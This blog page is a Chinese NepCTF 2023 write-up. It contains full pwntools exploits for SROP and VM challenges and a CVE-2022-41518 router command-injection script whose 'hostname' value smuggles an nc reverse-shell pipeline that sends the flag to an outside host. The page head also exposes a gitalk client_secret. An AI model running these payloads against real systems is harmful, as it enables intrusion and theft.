<!DOCTYPE html><html lang="zh-CN" theme="default"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="Csome"><title>[2023NepCTF] Csome Writeup · Csome</title><meta name="description" content="前言纪念一下，打的很爽Pwn抢了4道一血，可惜最后3分钟第一被超了

PwnsropSrop一把梭，这里要注意，跳转是PLT表的syscall函数和真实的系统调用不一样，在函数内会将rdi赋值给rax，后面的参数寄存器都要后移一位
1234567891011121314151617181920212"><meta name="keywords" content="Blog,博客,Hexo,Csome,CSOME"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta id="site_data_static" data-url="/"><meta name="renderer" content="webkit"><link rel="shortcut icon" type="image/x-icon" href="/images/favicon.webp"><link rel="stylesheet" href="/js_complied/bundle.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&amp;display=swap" rel="stylesheet"><script src="/js_complied/bundle.js"></script><script>Anatolo.comment.setConfig({"valine":{"enable":false,"appid":null,"appkey":null,"notify":false,"verify":false,"avatar":"mm","placeholder":"hello, world"},"gitment":{"enable":false,"owner":"Your GitHub ID","repo":"Repo to store comments","client_id":"Your client ID","client_secret":"Your client secret"},"gitalk":{"enable":true,"owner":"csomepro","repo":"blogComment","client_id":"7d6a77c3aaf8c1731f93","client_secret":"bdcc0b620d6bc922d81a3f92d3ecf0ecb1c8feee"},"duoshuo":null,"disqus":null,"gentie":null})</script><link rel="stylesheet" href="/css/comments/gittalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script><meta name="generator" content="Hexo 8.1.0"></head><body> <main-outlet><div class="page-top animated"><div class="nav"><li><a href="/">首页</a></li><li><a href="/archives">归档</a></li><li><a href="/tags">标签</a></li><li><a href="/about">关于</a></li><li><a href="/links">友链</a></li></div><div class="information"><div class="nav_right_btn"><li class="btn-toggle-more"><i class="fa fa-ellipsis"></i></li><li class="btn-go-back"><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li><li class="btn-search"><a class="fa fa-search" onclick="Anatolo.search.openWindow();"></a></li><li class="btn-toggle-theme"><a class="far fa-sun" onclick="Anatolo.darkLightToggle();"></a></li></div><div class="avatar"><img src="/images/Csome2.webp"></div></div></div><div class="toc-mobile"><div class="toc-button"><span>目录</span></div><div class="toc-container in-page animated fadeInDown"><div class="toclist-container"><div class="tocmenu"><ol class="toclist"><li class="toclist-item toclist-level-1"><a class="toclist-link" href="#%E5%89%8D%E8%A8%80"><span class="toclist-text">前言</span></a></li><li class="toclist-item toclist-level-1"><a class="toclist-link" href="#Pwn"><span class="toclist-text">Pwn</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#srop"><span class="toclist-text">srop</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#HRPVM2-0"><span class="toclist-text">HRPVM2.0</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#Nep-router"><span class="toclist-text">Nep router</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#login"><span class="toclist-text">login</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#HRP-CHAT"><span class="toclist-text">HRP-CHAT</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#1"><span class="toclist-text">1</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#2"><span class="toclist-text">2</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#3"><span class="toclist-text">3</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#4"><span class="toclist-text">4</span></a></li></ol></li></ol></li><li class="toclist-item toclist-level-1"><a class="toclist-link" href="#Misc"><span class="toclist-text">Misc</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#codes"><span class="toclist-text">codes</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E4%B8%8EAI%E5%85%B1%E8%88%9E%E7%9A%84%E5%93%88%E5%A4%AB%E6%9B%BC"><span class="toclist-text">与AI共舞的哈夫曼</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#ConnectedFive"><span class="toclist-text">ConnectedFive</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#CheckIn"><span class="toclist-text">CheckIn</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E9%99%8C%E7%94%9F%E7%9A%84%E8%AF%AD%E8%A8%80"><span class="toclist-text">陌生的语言</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E5%B0%8F%E5%8F%AE%E5%BC%B9%E9%92%A2%E7%90%B4"><span class="toclist-text">小叮弹钢琴</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E4%BD%A0%E4%B9%9F%E5%96%9C%E6%AC%A2%E4%B8%89%E6%9C%88%E4%B8%83%E4%B9%88"><span class="toclist-text">你也喜欢三月七么</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#lic"><span class="toclist-text">lic</span></a></li></ol></li><li class="toclist-item toclist-level-1"><a class="toclist-link" href="#Crypto"><span class="toclist-text">Crypto</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#random-RSA"><span class="toclist-text">random_RSA</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#simple-des"><span class="toclist-text">simple_des</span></a></li></ol></li><li class="toclist-item toclist-level-1"><a class="toclist-link" href="#Web"><span class="toclist-text">Web</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#ez-java-checkin"><span class="toclist-text">ez_java_checkin</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E7%8B%AC%E6%AD%A5%E5%A4%A9%E4%B8%8B-%E8%BD%AC%E7%94%9F%E6%88%90%E4%B8%BA%E9%95%9C%E8%8A%B1%E6%B0%B4%E6%9C%88%E4%B8%AD%E7%9A%84%E7%8E%8B%E8%80%85"><span class="toclist-text">独步天下-转生成为镜花水月中的王者</span></a></li></ol></li></ol></div></div></div></div><div class="sidebar animated"><div class="sidebar-top"><div class="logo-title"><div class="title"><img src="/images/Csome2.webp" style="width:200px;" alt="favicon"><h3 title=""><a href="/">Csome</a></h3><div class="description"><p>「算法」✔「CTF」✔「编曲」✔「唱歌」×</p></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/CsomePro"><i class="fab fa-github"></i></a></li><li><a href="mailto:csome@m.scnu.edu.cn"><i class="fa fa-envelope"></i></a></li></ul></div><div class="toc-container in-sidebar animated fadeInDown"><details class="ltr" open><summary>目录</summary><div class="toclist-container"><div class="tocmenu"><ol class="toclist"><li class="toclist-item toclist-level-1"><a class="toclist-link" href="#%E5%89%8D%E8%A8%80"><span class="toclist-text">前言</span></a></li><li class="toclist-item toclist-level-1"><a class="toclist-link" href="#Pwn"><span class="toclist-text">Pwn</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#srop"><span class="toclist-text">srop</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#HRPVM2-0"><span class="toclist-text">HRPVM2.0</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#Nep-router"><span class="toclist-text">Nep router</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#login"><span class="toclist-text">login</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#HRP-CHAT"><span class="toclist-text">HRP-CHAT</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#1"><span class="toclist-text">1</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#2"><span class="toclist-text">2</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#3"><span class="toclist-text">3</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#4"><span class="toclist-text">4</span></a></li></ol></li></ol></li><li class="toclist-item toclist-level-1"><a class="toclist-link" href="#Misc"><span class="toclist-text">Misc</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#codes"><span class="toclist-text">codes</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E4%B8%8EAI%E5%85%B1%E8%88%9E%E7%9A%84%E5%93%88%E5%A4%AB%E6%9B%BC"><span class="toclist-text">与AI共舞的哈夫曼</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#ConnectedFive"><span class="toclist-text">ConnectedFive</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#CheckIn"><span class="toclist-text">CheckIn</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E9%99%8C%E7%94%9F%E7%9A%84%E8%AF%AD%E8%A8%80"><span class="toclist-text">陌生的语言</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E5%B0%8F%E5%8F%AE%E5%BC%B9%E9%92%A2%E7%90%B4"><span class="toclist-text">小叮弹钢琴</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E4%BD%A0%E4%B9%9F%E5%96%9C%E6%AC%A2%E4%B8%89%E6%9C%88%E4%B8%83%E4%B9%88"><span class="toclist-text">你也喜欢三月七么</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#lic"><span class="toclist-text">lic</span></a></li></ol></li><li class="toclist-item toclist-level-1"><a class="toclist-link" href="#Crypto"><span class="toclist-text">Crypto</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#random-RSA"><span class="toclist-text">random_RSA</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#simple-des"><span class="toclist-text">simple_des</span></a></li></ol></li><li class="toclist-item toclist-level-1"><a class="toclist-link" href="#Web"><span class="toclist-text">Web</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#ez-java-checkin"><span class="toclist-text">ez_java_checkin</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E7%8B%AC%E6%AD%A5%E5%A4%A9%E4%B8%8B-%E8%BD%AC%E7%94%9F%E6%88%90%E4%B8%BA%E9%95%9C%E8%8A%B1%E6%B0%B4%E6%9C%88%E4%B8%AD%E7%9A%84%E7%8E%8B%E8%80%85"><span class="toclist-text">独步天下-转生成为镜花水月中的王者</span></a></li></ol></li></ol></div></div></details></div></div><div class="footer"><div class="p"><span>全站CC-BY-SA-3.0 </span><i class="fa fa-star"></i><span> Csome</span></div><div class="by_farbox"><span>Powered by</span><a href="https://hexo.io/zh-cn/" target="_blank"> Hexo</a><span> &</span><a href="https://github.com/Lhcfl/hexo-theme-anatolo" target="_blank"> Anatolo</a></div><div class="beian"></div></div></div><div class="main animated fadeInDown"><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated"><div class="post-title"><h3><a>[2023NepCTF] Csome Writeup</a></h3></div><div class="post-content"><p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>纪念一下，打的很爽Pwn抢了4道一血，可惜最后3分钟第一被超了</p>
<p><img src="/p/2023NepCTF/image-20230815163205113.png" alt="image-20230815163205113"></p>
<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="srop"><a href="#srop" class="headerlink" title="srop"></a>srop</h2><p>Srop一把梭，这里要注意，跳转是PLT表的syscall函数和真实的系统调用不一样，在函数内会将rdi赋值给rax，后面的参数寄存器都要后移一位</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;nepctf.1cepeak.cn&quot;</span>, <span class="number">31943</span>)</span><br><span class="line"></span><br><span class="line">mov_eax_15 = <span class="number">0x0000400754</span></span><br><span class="line">buf = <span class="number">0x00000601050</span></span><br><span class="line">ret = <span class="number">0x004007AE</span></span><br><span class="line">syscall = <span class="number">0x0004005B0</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400813</span></span><br><span class="line">stack = <span class="number">0x0601a50</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = stack-<span class="number">0x8</span></span><br><span class="line">frame.rcx = <span class="number">0x1000</span></span><br><span class="line">frame.rip = syscall</span><br><span class="line">frame.rsp = stack</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * (<span class="number">0x0030</span>+<span class="number">8</span>) + flat([</span><br><span class="line">    pop_rdi,</span><br><span class="line">    <span class="number">15</span>,</span><br><span class="line">    syscall</span><br><span class="line">]) + <span class="built_in">bytes</span>(frame)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rdi = <span class="number">2</span></span><br><span class="line">frame.rsi = stack-<span class="number">0x8</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rcx = <span class="number">0x1000</span></span><br><span class="line">frame.rip = syscall</span><br><span class="line">frame.rsp = stack + <span class="number">0x110</span></span><br><span class="line">payload = <span class="string">b&quot;./flag\x00\x00&quot;</span> + flat([</span><br><span class="line">    pop_rdi,</span><br><span class="line">    <span class="number">15</span>,</span><br><span class="line">    syscall </span><br><span class="line">]) + <span class="built_in">bytes</span>(frame) </span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = <span class="number">3</span></span><br><span class="line">frame.rdx = stack-<span class="number">0x100</span></span><br><span class="line">frame.rcx = <span class="number">0x40</span></span><br><span class="line">frame.rip = syscall</span><br><span class="line">frame.rsp = stack + <span class="number">0x110</span> + <span class="number">0x110</span></span><br><span class="line">payload += flat([</span><br><span class="line">    pop_rdi,</span><br><span class="line">    <span class="number">15</span>,</span><br><span class="line">    syscall </span><br><span class="line">]) + <span class="built_in">bytes</span>(frame) </span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rdi = <span class="number">1</span></span><br><span class="line">frame.rsi = <span class="number">1</span></span><br><span class="line">frame.rdx = stack-<span class="number">0x100</span></span><br><span class="line">frame.rcx = <span class="number">0x40</span></span><br><span class="line">frame.rip = syscall</span><br><span class="line">frame.rsp = stack + <span class="number">0x110</span> + <span class="number">0x110</span> + <span class="number">0x110</span></span><br><span class="line">payload += flat([</span><br><span class="line">    pop_rdi,</span><br><span class="line">    <span class="number">15</span>,</span><br><span class="line">    syscall </span><br><span class="line">]) + <span class="built_in">bytes</span>(frame) </span><br><span class="line"></span><br><span class="line">log.success(<span class="string">f&quot;length <span class="subst">&#123;<span class="built_in">len</span>(payload):#x&#125;</span>&quot;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="HRPVM2-0"><a href="#HRPVM2-0" class="headerlink" title="HRPVM2.0"></a>HRPVM2.0</h2><p>核心思想是替换文件，这里重写了kernel文件，之后python再次调用程序就可以执行了shell了</p>
<p><img src="/p/2023NepCTF/image-20230814091413997.png" alt="image-20230814091413997"></p>
<p>命令顺序如下，这里不能输入#，但是shell脚本使用Popen需要有shabang开头，但是shabang并不被sh执行，但输入又不能输入回车，所以这里可以采用env -S绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir app/templates</span><br><span class="line">cd app/templates</span><br><span class="line">echo #!/usr/bin/env -S python3 -c &quot;import os; os.system(&#x27;cat flag&#x27;)&quot;&gt;kernel</span><br><span class="line">mount kernel</span><br></pre></td></tr></table></figure>

<p><img src="/p/2023NepCTF/image-20230814091915281.png" alt="image-20230814091915281"></p>
<p>但是mount会需要权限校验，这里需要利用溢出漏洞，off by “two”，也就是爆破1&#x2F;16，踩中一个权限偏移内不为0的有效的堆地址，就可以绕过权限校验</p>
<p><img src="/p/2023NepCTF/image-20230814091404375.png" alt="image-20230814091404375"></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">req = requests.session()</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://nepctf.1cepeak.cn:30424&quot;</span></span><br><span class="line">req.get(url)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&quot;./kernel&quot;)</span></span><br><span class="line">io = tube()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">io_recv_raw</span>(<span class="params">*a</span>):</span><br><span class="line">    r = req.get(url + <span class="string">&quot;/receive&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r.json())</span><br><span class="line">    <span class="keyword">return</span> r.json().get(<span class="string">&#x27;output&#x27;</span>, <span class="string">&quot;&quot;</span>).encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">io_send_raw</span>(<span class="params">x</span>):</span><br><span class="line">    r = req.post(url + <span class="string">&quot;/send&quot;</span>, data=&#123;<span class="string">&quot;input&quot;</span>: x&#125;)</span><br><span class="line">    </span><br><span class="line">io.recv_raw = io_recv_raw</span><br><span class="line">io.send_raw = io_send_raw</span><br><span class="line"><span class="comment"># tob = lambda x: x.encode(&quot;utf-8&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rm</span>(<span class="params">file</span>):</span><br><span class="line">    io.sendafter(<span class="string">b&quot;$&quot;</span>, <span class="string">b&quot;rm %b&quot;</span> % (file,))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cat</span>(<span class="params">file</span>):</span><br><span class="line">    io.sendafter(<span class="string">b&quot;$&quot;</span>, <span class="string">b&quot;cat %b&quot;</span> % (file,))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>(<span class="params">content</span>):</span><br><span class="line">    io.sendafter(<span class="string">&quot;Make a wish to Nepnep&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">echo</span>(<span class="params">file, content</span>):</span><br><span class="line">    io.sendafter(<span class="string">b&quot;$&quot;</span>, <span class="string">b&quot;echo %b&gt;%b&quot;</span> % (content, file))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mkdir</span>(<span class="params">name</span>):</span><br><span class="line">    io.sendafter(<span class="string">b&quot;$&quot;</span>, <span class="string">b&quot;mkdir %b&quot;</span> % (name,))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cd</span>(<span class="params">name</span>):</span><br><span class="line">    io.sendafter(<span class="string">b&quot;$&quot;</span>, <span class="string">b&quot;cd %b&quot;</span> % (name,))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exec</span>(<span class="params">name</span>):</span><br><span class="line">    io.sendafter(<span class="string">b&quot;$&quot;</span>, <span class="string">b&quot;exec %b&quot;</span> % (name,))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">id</span>():</span><br><span class="line">    io.sendafter(<span class="string">b&quot;$&quot;</span>, <span class="string">b&quot;id&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mount</span>(<span class="params">name</span>):</span><br><span class="line">    io.sendafter(<span class="string">b&quot;$&quot;</span>, <span class="string">b&quot;mount %b&quot;</span> % (name,))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leave</span>():</span><br><span class="line">    io.sendafter(<span class="string">b&quot;$&quot;</span>, <span class="string">b&quot;exit&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">    log.success(<span class="string">f&quot;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;<span class="subst">&#123;i&#125;</span>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&quot;</span>)</span><br><span class="line">    leave()</span><br><span class="line">    req.get(url)</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">    init(payload + <span class="string">b&quot;;&quot;</span> * (<span class="number">104</span> - <span class="built_in">len</span>(payload)))</span><br><span class="line">    mkdir(<span class="string">b&quot;app/templates&quot;</span>)</span><br><span class="line">    cd(<span class="string">b&quot;app/templates&quot;</span>)</span><br><span class="line">    echo(<span class="string">b&quot;kernel&quot;</span>, <span class="string">b&quot;&quot;&quot;#!/usr/bin/env -S python3 -c &quot;import os; os.system(&#x27;cat flag&#x27;)&quot; &quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    echo(<span class="string">b&quot;data&quot;</span>, <span class="string">b&quot;a&quot;</span>*(<span class="number">0x100</span>-<span class="number">2</span>) + <span class="string">b&quot;bc&quot;</span> + <span class="string">b&quot;\x21\x42&quot;</span>)</span><br><span class="line">    cat(<span class="string">b&quot;kernel&quot;</span>)</span><br><span class="line">    echo(<span class="string">b&quot;step1&quot;</span>, <span class="string">b&quot;mov rdi,data; syscall 0;&quot;</span>)</span><br><span class="line">    echo(<span class="string">b&quot;step2&quot;</span>, <span class="string">b&quot;mov rdi,data; mov rdx,258; syscall 1;&quot;</span>)</span><br><span class="line">    <span class="built_in">exec</span>(<span class="string">b&quot;step1&quot;</span>)</span><br><span class="line">    <span class="built_in">exec</span>(<span class="string">b&quot;step2&quot;</span>)</span><br><span class="line"></span><br><span class="line">    mount(<span class="string">b&quot;kernel&quot;</span>)</span><br><span class="line"><span class="comment">#  59  52 65 0f 37  56 </span></span><br><span class="line"><span class="comment"># 7c  12 3c 44 45  56</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="Nep-router"><a href="#Nep-router" class="headerlink" title="Nep router"></a>Nep router</h2><p><a target="_blank" rel="noopener" href="https://gitee.com/baozhazhizi/IoT-vulhub/tree/master/Totolink/CVE-2022-41518">https://gitee.com/baozhazhizi/IoT-vulhub/tree/master/Totolink/CVE-2022-41518</a></p>
<p>CVE-2022-41518一把梭，这里用反弹shell得到flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> contextlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line">login_url = <span class="string">&quot;http://106.75.63.100:34903/formLoginAuth.htm?authCode=1&amp;userName=admin&amp;goURL=home.html&amp;action=login&quot;</span></span><br><span class="line">raw = session.get(login_url, timeout=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">inject_url = <span class="string">&quot;http://106.75.63.100:34903/cgi-bin/cstecgi.cgi&quot;</span></span><br><span class="line">inject_data = &#123;</span><br><span class="line">    <span class="string">&quot;proto&quot;</span>:<span class="string">&quot;8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hostname&quot;</span>:<span class="string">&quot;&#x27;;&quot;</span> + <span class="string">&quot;&quot;&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/cat /flag/flag  |nc xxx.xxx.xxx.xxx 1234 &gt;/tmp/f&quot;&quot;&quot;</span> + <span class="string">&quot;;&#x27;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;topicurl&quot;</span>:<span class="string">&quot;setOpModeCfg&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> contextlib.suppress(Exception):</span><br><span class="line">    resp = session.post(inject_url, json = inject_data, timeout=<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;shell!? ---------------&gt; &quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>首先是路径穿越，由于不会校验目录，可以直接访问文件，下载文件，最后可以下载得到login ELF文件以及libc库，之后逆向很快能看到sprintf格式化字符串漏洞，最难就是本地调试找堆指针</p>
<p>exp</p>
